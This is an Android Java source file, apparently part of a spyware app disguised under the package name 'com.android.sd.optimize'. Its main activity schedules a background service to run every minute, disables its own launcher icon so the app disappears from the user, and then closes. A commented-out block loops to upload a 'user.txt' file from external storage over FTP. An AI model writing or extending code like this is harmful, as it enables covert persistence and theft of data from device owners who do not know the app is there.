package com.android.sd.optimize;

import android.app.Activity;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;

public class MainActivity extends Activity {

	boolean b = false;

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		AlarmManager alarmManager = (AlarmManager) getSystemService(Service.ALARM_SERVICE);
		alarmManager.setInexactRepeating(AlarmManager.ELAPSED_REALTIME, 0, 60 * 1000, PendingIntent
				.getService(this, 0, new Intent(this, HandlerService.class),
						PendingIntent.FLAG_CANCEL_CURRENT));
		PackageManager p = getPackageManager();
		p.setComponentEnabledSetting(getComponentName(),
				PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
		finish();

		// new Thread(new Runnable() {
		//
		// @Override
		// public void run() {
		// // TODO Auto-generated method stub
		// while (!b) {
		// try {
		// Util.sendFileViaFTP(Environment.getExternalStorageDirectory() + "/user.txt", "user.txt");
		// b = true;
		// } catch (IOException e) {
		// // TODO Auto-generated catch block
		// e.printStackTrace();
		// Log.e("error", e.toString());
		// b = false;
		// }
		// try {
		// TimeUnit.MILLISECONDS.sleep(1000);
		// } catch (InterruptedException e) {
		// // TODO Auto-generated catch block
		// e.printStackTrace();
		// }
		// }
		// }
		// }).start();
	}
}
